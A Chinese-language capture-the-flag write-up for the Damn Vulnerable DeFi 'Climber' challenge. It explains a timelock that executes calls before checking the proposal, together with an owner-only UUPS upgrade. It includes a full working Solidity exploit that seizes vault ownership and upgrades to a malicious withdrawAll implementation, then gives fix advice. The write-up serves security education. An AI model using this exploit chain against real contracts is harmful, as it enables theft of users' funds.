# Climber

## 一、题目简介

本题目围绕**时间锁合约执行逻辑漏洞 + UUPS 可升级代理权限绕过**展开，是 DeFi 权限逃逸与代理升级攻击考点。项目部署了可升级金库合约 `ClimberVault`，金库所有权与治理权限交由 `ClimberTimelock` 时间锁合约托管，用于管控金库资产与合约升级。

时间锁合约原本设计了提案权限、执行延迟双重风控，仅授权指定 proposer 发起提案、延时执行治理操作，以此保障金库资产安全。题目核心目标为：利用时间锁合约**先执行、后校验**的逻辑漏洞，夺取金库完整所有权，通过升级代理合约植入恶意提款逻辑，**清空金库全部 10,000,000 DVT 代币**并转入回收账户，完成通关。

核心环境参数：

- 金库余额：10,000,000 DVT

- 治理模式：时间锁合约管控，自带 1 小时执行延迟

- 权限体系：ADMIN 管理员、PROPOSER 提案员双角色分离

- 合约架构：UUPS 可升级代理模式，仅 owner 可执行升级

攻击目标：绕过时间锁权限与延迟限制，夺取金库所有权，升级合约实现任意提款，窃取全部资产。

## 二、审计视角分析

### 1\. 时间锁核心高危漏洞  
常规时间锁合约逻辑为：**先提案 schedule → 等待延迟 → 执行 execute**，所有未提案操作禁止执行。但本题 `ClimberTimelock` 完全颠倒校验时序：

**execute 函数先批量执行所有操作，再校验提案是否存在**。

该漏洞属于致命逻辑缺陷：攻击者可直接调用 execute 执行任意治理操作，在执行过程中完成权限篡改、延迟清零、所有权转移，最后通过合约内回调完成 schedule 提案登记，绕过所有前置校验。

### 2\. 代码

时序倒置，彻底破坏时间锁安全模型：

```solidity
function execute(...) external payable {
    // 校验参数长度
    if (targets.length <= MIN_TARGETS) { revert InvalidTargetsCount(); }
    if (targets.length != values.length) { revert InvalidValuesCount(); }
    if (targets.length != dataElements.length) { revert InvalidDataElementsCount(); }

    bytes32 id = getOperationId(...);

    // 核心：先执行外部调用，再校验操作状态
    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    // 后校验：此时所有恶意操作已执行完毕，校验完全失效
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```

**漏洞本质**：标准时间锁必须「先提案、后执行」，但本合约 **先执行所有交易、后校验提案状态**。攻击者可直接调用 execute 执行任意治理操作，无需提前 schedule、无需等待 1 小时延迟，后置校验完全形同虚设。

**漏洞影响**：任意外部用户可无条件执行高危治理逻辑，篡改权限、清零延迟、转移合约所有权。

### 3\. 权限自授予缺陷

时间锁合约初始化时将管理员权限授予自身，为权限劫持提供了前置条件：

```solidity
_grantRole(ADMIN_ROLE, address(this)); // self administration

```

**漏洞本质**：合约自身持有 ADMIN 最高管理员权限，结合上述时序漏洞，攻击者可通过 execute 调用时间锁自身的 grantRole 方法，让时间锁**主动给攻击者授予 PROPOSER\_ROLE 提案权限**，实现权限从零获取。

**漏洞影响**：无需任何白名单身份，攻击者可直接成为合法提案人，完全突破角色权限隔离机制。

### 4\. UUPS 升级权限单一校验缺陷  

金库升级权限仅依赖 owner 单一重校验，无二次风控：

```solidity
function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}

```

**漏洞本质**：UUPS 合约升级授权函数仅使用 `onlyOwner` 修饰，无治理多签、时间锁二次校验。只要获取合约 owner 权限，即可任意替换合约实现逻辑。

**漏洞影响**：攻击者夺取金库 owner 权限后，可部署恶意实现合约、植入自定义提款后门，清空合约所有资产。

### 5\. 汇总致命缺陷

时间锁的 `grantRole`、`updateDelay`、`transferOwnership` 均为高危治理函数，但合约未做调用身份强校验：

- 任意地址可通过 execute 调用 grantRole，给自己授予提案权限

- 任意地址可清零时间锁延迟，消除治理冷却限制

- 时间锁作为金库 owner，可无条件转移金库所有权

### 6\. UUPS 代理升级权限可控漏洞

金库 `ClimberVault` 采用 UUPS 可升级模式，升级函数 `upgradeToAndCall` 仅校验 **owner 权限**。一旦攻击者通过时间锁漏洞夺取金库 owner 权限，即可随意替换合约实现逻辑，植入自定义提款函数，无任何风控拦截。

## 三、开发者默认安全假设

1. **时序安全假设**：默认时间锁严格遵循「先提案后执行」逻辑，不会出现先执行后补提案的绕过场景。

2. **权限隔离假设**：默认 PROPOSER 角色仅指定白名单地址，外部地址无法获取提案、治理权限。

3. **延迟安全假设**：默认 1 小时治理延迟不可篡改，可抵御瞬时恶意治理操作。

4. **所有权安全假设**：默认金库所有权永久锁定在时间锁合约，不会被恶意转移。

5. **代理升级安全假设**：默认 owner 权限可控，不会被攻击者夺取并恶意升级合约。

## 四、同类项目通用审计

1. **时间锁合约时序审计**：严格校验 execute/schedule 执行顺序，必须先提案、后执行，禁止反向绕过逻辑。

2. **治理函数权限校验**：所有角色授权、参数修改、所有权转移函数，必须添加严格的身份白名单校验。

3. **时间延迟防篡改**：治理延迟参数仅允许管理员修改，禁止任意用户清零或篡改。

4. **代理合约权限管控**：UUPS/透明代理的升级权限、所有权权限需重点防护，防止权限逃逸。

5. **批量交易风控**：多交易组合执行场景，防止单笔交易完成「权限获取-逻辑篡改-资产窃取」完整攻击链。

## 五、解题思路

攻击链路：**绕过时间锁校验 → 夺取治理权限 → 清零延迟限制 → 接管金库所有权 → 恶意升级合约 → 清空资产**。

1. **构造批量治理交易**：组装 4 笔连环交易，包含「授予自身提案权限、清零时间锁延迟、转移金库所有权、回调补录提案」。

2. **利用时序漏洞执行攻击**：调用时间锁 execute 先执行所有恶意治理操作，再通过内部回调调用 schedule 补录提案，绕过后置校验报错。

3. **接管金库完整权限**：执行完成后，玩家成为金库唯一 owner，拥有合约升级、任意操作权限。

4. **部署恶意升级合约**：编写继承原金库的恶意合约，新增任意提款函数，保留官方升级安全修饰符。

5. **升级代理并窃取资产**：调用 UUPS 升级接口替换合约实现，调用自定义提款函数，将全部代币转入回收账户，完成通关。

## 六、报错复盘

### 报错1：NotReadyForExecution 提案未就绪回滚

**原因**：严格遵循漏洞逻辑，必须 **先 execute 执行、后 schedule 补录提案**；颠倒顺序会导致执行时无提案匹配，直接报错。

**解决**：固定执行顺序，execute 执行恶意操作后，通过合约回调自动调用 schedule 完成提案登记。

### 报错2：合约类型转换编译错误（payable 非法转换）

**原因**：直接将合约结构体强转为 payable 地址，Solidity 0.8.25 禁止隐式/非法合约类型转换。

**解决**：统一转为原生 address 类型后再操作，杜绝强制类型转换报错。

### 报错3：bytes32 数值类型转换失败

**原因**：直接传入整型数字赋值 bytes32 盐值，Solidity 不支持直接隐式转换。

**解决**：使用固定合法盐值 `bytes32("123")`，无需自定义随机数值，规避类型报错。

### 报错4：权限不足，升级合约失败

**原因**：时间锁操作未成功转移金库所有权，玩家未获取 owner 权限，无法调用 upgradeToAndCall。

**解决**：确保批量交易中 transferOwnership 执行成功，优先夺取所有权再执行升级操作。

## 七、EXP

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(payable(timelock), address(vault));
        exploit.timelockExecute();
        
        PawnedClimberVault newVaultImpl = new PawnedClimberVault();
        vault.upgradeToAndCall(address(newVaultImpl), "");
        
        PawnedClimberVault(address(vault)).withdrawAll(address(token), recovery);  
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Exploit {
    address payable private immutable timelock;

    uint256[] private _values = [0, 0, 0, 0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _timelock, _vault, address(this)];

        _elements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[3] = abi.encodeWithSignature("timelockSchedule()");
    }

    function timelockExecute() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("123"));
    }

    function timelockSchedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("123"));
    }
}

contract PawnedClimberVault is ClimberVault {
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
    function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
        // withdraw the whole token balance from the contract
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }
}

```

## 八、合约修复方案

1. **修复时间锁执行时序漏洞**：强制修改 execute 逻辑，改为「先校验提案、后执行交易」，禁止无提案直接执行治理操作，从根源杜绝时序绕过。

2. **强化治理函数权限**：对 `grantRole`、`updateDelay`、`transferOwnership` 等高危函数添加管理员白名单校验，仅 ADMIN 角色可调用。

3. **锁定治理延迟参数**：禁止将时间锁延迟清零，设置最小延迟阈值，杜绝瞬时恶意治理操作。

4. **限制金库所有权转移**：金库 owner 仅允许时间锁合约，禁止任意地址接收所有权，防止权限逃逸。

5. **加固 UUPS 升级权限**：升级操作不允许单一 owner 直接执行，必须经过时间锁提案+延迟执行双重校验，防止恶意升级。

## 九、漏洞总结

Climber 关卡核心漏洞为**时间锁合约先执行后校验的逻辑倒置漏洞**，搭配 UUPS 代理升级权限管控缺失形成完整攻击链。开发者完全违背时间锁安全设计初衷，颠倒执行与校验时序，导致所有治理权限彻底失控。

攻击者可无需权限、无需延迟，批量执行高危治理操作，夺取金库所有权后，通过恶意升级合约突破原有功能限制，窃取全部资产。本题重点考察时间锁合约底层安全逻辑、治理权限审计、UUPS 代理升级风险。

